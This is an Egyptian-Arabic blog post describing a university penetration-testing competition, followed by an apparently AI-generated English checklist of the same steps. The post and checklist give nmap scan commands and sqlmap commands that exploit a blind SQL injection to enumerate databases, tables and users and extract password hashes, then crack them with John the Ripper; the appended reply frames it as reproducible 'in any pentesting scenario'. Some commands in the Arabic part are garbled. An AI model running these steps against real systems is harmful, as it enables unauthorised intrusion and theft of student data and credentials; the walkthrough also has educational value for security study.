**المقال دا هتكلم عن طريقه استخدمتها في عمليه اختبار اختراق للنظام الامني الخاصه بالجامعه بتاعتي دي كانت مسابقه الجامعه اطلقتها امس وشاركت فيها واخدت المركز الاول بفضل الله في البدايه انا و نت رايدرز مش مسؤولين عن الطريقه لو حد استخدمها بشكل غير قانوني وهذه المقاله لزياده المعرفه**

**في البدايه اهم شئ هو جمع المعلومات او ما يسمي Information Gathering**

**مرحله تجمبع المعلومات دي اهم مرحله دي بتجمع فيها المعلومات الخاصه بالهدف بتاعك سوا هتعمل ==Active== ==Information Gathering== او ==Passive Information Gathering== الهدف اللي اشتغلت عليه هو موقع الجامعه الاساسي وهو مربوط بالنظام الامني للجامعه علي سيرفر واحد**

1:**في البدايه جمعت المعلومات اللي كنت محتاجها زي معرفه نوع نظام التشغيل السيرفر والبروتوكلات اللي شغاله عالسيرفر وبدات اخمن هيكليه النظام بالكامل اذا كان الموقع مرتبط بالنظام فممكن يكون فيه اكتر من سيرفر زي ويندوز الخ………**

**في بعض الظروف الوصول الى الويب سيرفر بمكنك من الوصول الى server DB زي لوحة التحكم بتخليك تقدر سوا هتضيف او تحذف بيانات وممكن متقدرش توصل لقاعدة البيانات والتعدٌل علٌيها من الويب فقط من داخل النظام فقط بمكنك التحكم بالموقع ومتقدرش تتحكم بقاعده البيانات طبعا اغلب مواقع الجامعات مربوطه بقواعد بيانات علشان الطلاب يدخلو يشوفو درجاتهم الخ…..**

**بعض قواعد البيانات اللي زي sql server و oracle 10g لو وصلت ليها سهل تتحكم فيها وهي اسهل بكتير من اختراق my sql**

**في البدايه كان الهدف بتاعي اني اقدر اوصل لقواعد البيانات الموجوده وطبعا الجامعات عندها شبكه واي فاي وبيستخدمو switch & routers & firewall & servers الحقيقه كان صعب اعرف مخطط او التوبولجي الخاصه بالشبكه لان اللي مصممها مهندسين متخصصين بس الموضوع مكنش عقبه كبيره وبمااني درست شبكات فعندي خبره كافيه تخليني اتوقع الطريق عالسيرفر بالظبط وبدات اشوف هل فيه جدار حمايه وقاعده البيانات وسيرفر الموقع منفصلين ولا علي سيرفر واحد**

**طبعا في ادوات كتيره في كالي لينكس قدرت اعرف بيها نوع نظام التشغيل والبورتات المفتوحه عالسيرفر عن طريق اني بعت طلب للسيرفر بطريقه خلتني اعرف البورتات المفتوحه والبروتوكولات ونوع نظام قواعد البيانات وتقدر تستخدم nmap في انك تعرف المعلومات دي بشكل ساهل**

[![](https://netriders.academy/storage/2024/07/photo_2024-07-04_11-49-09-1024x158.jpg)](https://netriders.academy/storage/2024/07/photo_2024-07-04_11-49-09.jpg)

**علشان الخصوصيه بس مش هوضح غير الامر اللي استخدمته هنا لكن نتيجه الفحص كان ظاهر فيها مستوي حمايه ومكنش فيه اي نتيجه لكن استخدمت طريقه تانيه للفحص منها tcp port scan & syn scan & udp scan دي طريقه بحب استخدمها في الفحص دايما**

**==run a tcp connect  
nmap –sT -p- -PN 172.16.45.135  
xmas tree scan  
nmap –sX -p- -PN 172.16.45.129  
null scan  
nmap –sN -p- -PN 172.16.45.129  
To run a SYN scan  
nmap –sS -p- -PN 172.16.45.135  
UDP scan against our target  
nmap –sU 172.16.45.129==**

غيرت طريقه الفحص واستخدمت امرnmap-po

[![](https://netriders.academy/storage/2024/07/photo_2024-07-04_12-04-12-1024x188.jpg)](https://netriders.academy/storage/2024/07/photo_2024-07-04_12-04-12.jpg)

**دي النتيجه لقيت بورت 80 مفتوح لكن الفايرول بيسمح بالاتصالات الخارجه والداخله عن طريق بورت 80**

**سيرفر الويب هنا بياخد البيانات من سيرفر قاعده البيانات عن طريق الشبكه الداخليه والشبكه دي عليها الفايرول اللي عملي مشكله في التخطي وعمليات الفحص طيب دلوقتي انا متصل علي سيرفر الويب بس والهدف بتاعي سيرفر قواعد البيانات وعلشان اوصل ليه محتاج اني استخدم كوبري واللي هو سيرفر الويب اللي معانا خط اتصال port 80 http ومكنش قدامي غير اختراق تطبيق الويب علشان اوصل لقواعد البيانات لقيت الدنيا قفلت في وشي ومفيش غير اني اخترق الموقع وبدات اني افحص الثغرات بشكل دقيق جدا جدا واستخدمت ادوات من لينكس زي Acunetix &w3af و ميتاسبلويت لما عملت الفحص لقيتsql من نوع blind هنا لقيت الثغره لكن مقدرتش اعمل bruteforce ومكنش قدامي غير اني اعمل اكسبلويت او حقن فااضريت اني ادخل للشبكه و بعد مدخلت استخدمت اداه sqlmap ودخلت المسار دا Cd /pentest/database/sqlmap**

**==sqlmap.py –u http://www.00000000.com/article.php?id=1 –dbs==**

**==والنتيجه ظهرتلي قاعده البيانات لكن مينفعش اعرض دا طبعا للخصوصيه وبعد مظهرت قاعده البيانات احتجت اجمع معلومات اكتر وااستخدمت الامر دا==**

**==./sqlmap.py –u http://www.0000000.com/article.php?id=1 –fingerprint==**

**==طبعا طلعت نظام قاعده البيانات وكان اوراكل ونظام السيرفر وبندوز سيرفر 2008 ولغه برمجه الموقع asp.net واصدار قاعده البيانات كان اوراكل 10g==**

**==بعد معملت كل دا كنت محتاج ارقي الصلاحيات بتاعتي واني محتاج اظهر معلومات من قاعده البيانات وااستخدمت sqlmap واستخدمت sqlninja==**

**==./sqlmap.py –u http://www.XXXX.com/article.php?id=1 –dbs والنتيجه اللي هتظهر معاك هي جميع قواعد البيانات==**

**تقدر بكل سهوله تعمل دامب للبيانات وتعرض نتايج الطلاب عن طريق الامر دا**

**==sqlmap.py –u http://www.000000.com/article.php?id=1 -D COMPUTER –table==**

**بعد كدا كنت عاوز ادخل النظام نفسه وبدات اظهر كل المستخدمين لنظام اوراكل نفسه مش الموقع عن طريق الامر دا**

**==./sqlmap.py –u http://www.XXXX.com/article.php?id=1 – – users==**

**وبعد كدا كنت عاوز اعرف كلمه السر لكن كانت مشفره واستخدمت اداه john the ripper وكتبت الامر دا**

**==./sqlmap.py –u http://www.XXXX.com/article.php?id=1 –password==**

**وبعد مكسرت تشفير الباسورد ظهرلي الباسورد اخيراااااااااا**

**طبعا فيه صور كنت واخدها اسكرين لكن مينفعش علشان الخصوصيه**

**اتمني تكونو استفادتم ومتستخدموش الطرق دي في شئ غير قانوني**

**دمتم بخير**

-- -
Sure, here is the report reformatted into a set of notes with checkboxes, focusing on the commands for reproducibility in any pentesting scenario:

```markdown
# Penetration Testing Report Notes

**Disclaimer:** This article discusses a penetration testing method used on my university's security system as part of a competition held by the university. I participated and secured the first place. This article is for educational purposes only. Neither I nor Net Raiders are responsible for any illegal use of this method.

## Information Gathering

- [ ] **Collect Necessary Information:**
  - Identify the server's operating system and protocols in use.
  - Determine the entire system architecture, including potential multiple servers like Windows, etc.

- [ ] **Determine Web Server and Database Server Setup:**
  - Verify if the web server allows access to the database server.
  - Check if the database can be accessed only from within the system or if it can be modified from the web.

- [ ] **Identify Database Types:**
  - Universities typically have databases for students to check their grades, etc.
  - Common database types: SQL Server, Oracle 10g, MySQL.

- [ ] **Understand Network Topology:**
  - Universities often use Wi-Fi, switches, routers, firewalls, and servers.
  - Predict the server's path based on network studies.

- [ ] **Identify Open Ports and Protocols:**
  - Use Kali Linux tools to identify the operating system and open ports on the server.

### Nmap Commands:

- [ ] TCP connect scan
  ```shell
  nmap -sT -p- -PN 172.16.45.135
  ```

- [ ] Xmas tree scan
  ```shell
  nmap -sX -p- -PN 172.16.45.129
  ```

- [ ] Null scan
  ```shell
  nmap -sN -p- -PN 172.16.45.129
  ```

- [ ] SYN scan
  ```shell
  nmap -sS -p- -PN 172.16.45.135
  ```

- [ ] UDP scan
  ```shell
  nmap -sU 172.16.45.129
  ```

### Findings:
- [x] Port 80 was open, allowing both incoming and outgoing connections.
- [x] The web server retrieves data from the database server through the internal network, protected by a firewall.

## Exploitation Phase

- [ ] **Attempt to Bypass the Firewall:**
  - Focus on exploiting the web application to access the database server.

- [ ] **Scan for Vulnerabilities:**
  - Use tools like Acunetix, w3af, and Metasploit for a thorough vulnerability scan.
  - Identified a blind SQL injection vulnerability.

- [ ] **Exploit the SQL Injection:**
  - Use `sqlmap` for SQL injection and database enumeration.

### Sqlmap Commands:

- [ ] Initial database enumeration
  ```shell
  sqlmap.py -u http://www.00000000.com/article.php?id=1 --dbs
  ```

- [ ] Database fingerprinting
  ```shell
  ./sqlmap.py -u http://www.0000000.com/article.php?id=1 --fingerprint
  ```

- [ ] List all databases
  ```shell
  ./sqlmap.py -u http://www.XXXX.com/article.php?id=1 --dbs
  ```

- [ ] Dump specific database tables
  ```shell
  sqlmap.py -u http://www.000000.com/article.php?id=1 -D COMPUTER --tables
  ```

- [ ] Enumerate database users
  ```shell
  ./sqlmap.py -u http://www.XXXX.com/article.php?id=1 --users
  ```

- [ ] Retrieve passwords (encrypted)
  ```shell
  ./sqlmap.py -u http://www.XXXX.com/article.php?id=1 --password
  ```

### Post-Exploitation:

- [ ] **Decrypt Passwords:**
  - Use `John the Ripper` to decrypt the retrieved passwords.

```shell
# Using John the Ripper to decrypt passwords
john /path/to/password/file
```

## Conclusion

- This methodology was used to secure first place in the university's competition.
- Ensure ethical use of these methods and tools.
- Screenshots were taken but are not included here for privacy reasons.

**Stay safe and use this knowledge responsibly.**

**Best regards,**
[Your Name]
```

This format focuses on actionable steps and commands, making it easier to reproduce the process in any pentesting scenario.